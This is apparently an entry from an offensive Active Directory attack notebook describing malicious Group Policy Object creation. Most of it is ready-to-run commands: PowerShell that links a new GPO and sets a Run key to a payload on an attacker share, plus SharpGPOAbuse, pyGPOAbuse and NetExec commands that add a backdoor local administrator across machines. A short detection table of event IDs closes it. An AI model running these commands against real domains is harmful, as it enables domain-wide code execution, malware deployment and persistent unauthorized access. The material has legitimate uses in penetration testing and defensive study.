---
title: "Attack #66 — Malicious GPO Creation"
description: "An attacker with GPO creation rights (or who compromises a GPO-managing account) can create or modify Group Policy Objects to execute malicious scripts…"
category: active-directory
tags: ["active-directory"]
tools: ["NetExec", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Eight/🟤 Attack #66 — Malicious GPO Creation.md"
---
# 🟤 Attack #66 — Malicious GPO Creation

***

## 📖 How It Works

An attacker with **GPO creation rights** (or who compromises a GPO-managing account) can create or modify Group Policy Objects to execute malicious scripts, create scheduled tasks, or deploy software across the domain. GPOs can target specific OUs — allowing precise payload delivery to selected groups of machines or users.

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **GPO creation/edit rights** | Typically Group Policy Creator Owners or DA |
| **GPO linked to target OU** | Must link GPO for it to apply |

***

## 💻 Full Commands

```powershell
# ── Create new GPO ────────────────────────────────────────────────────────────
New-GPO -Name "IT Maintenance" | New-GPLink -Target "OU=Servers,DC=corp,DC=local"

# ── Add startup script to GPO ─────────────────────────────────────────────────
Set-GPPrefRegistryValue -Name "IT Maintenance" -Action Create \
  -Context Computer -Key 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' \
  -ValueName 'Maintenance' -Type String -Value '\\ATTACKER\share\evil.exe'

# ── SharpGPOAbuse (automated GPO abuse) ───────────────────────────────────────
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" \
  --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" \
  --Arguments "/c net user hacker P@ss! /add && net localgroup Administrators hacker /add" \
  --GPOName "IT Maintenance"

# ── pyGPOAbuse (Linux) ────────────────────────────────────────────────────────
python3 pygpoabuse.py corp.local/Administrator:'Password1' \
  -gpo-id "12345678-ABCD-1234-ABCD-123456789012" \
  -command "net user hacker P@ss! /add" -f
```

```bash
# ── NetExec — execute via GPO ─────────────────────────────────────────────────
nxc smb DC01.corp.local -u Administrator -p 'Password1' -M gpo_abuse
```

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **5136** | Security Log (DC) | GroupPolicyContainer object modified |
| **4688** | Security Log | Script execution from GPO startup/logon path |
| **5145** | Security Log | SYSVOL script access |

***

## 🔗 Attack Chain Context

```
[Malicious GPO] ──→ Domain-wide code execution via Group Policy
         │
         ├──→ 💻 Deploy malware, create admin users, disable AV across the domain
         ├──→ 🔗 GPO applies on reboot/logon — patient persistence
         └──→ 💀 Defeated by: restrict GPO creation rights, audit GPO changes
```

***

> ✅ **Attack #66 — Malicious GPO Creation complete.**
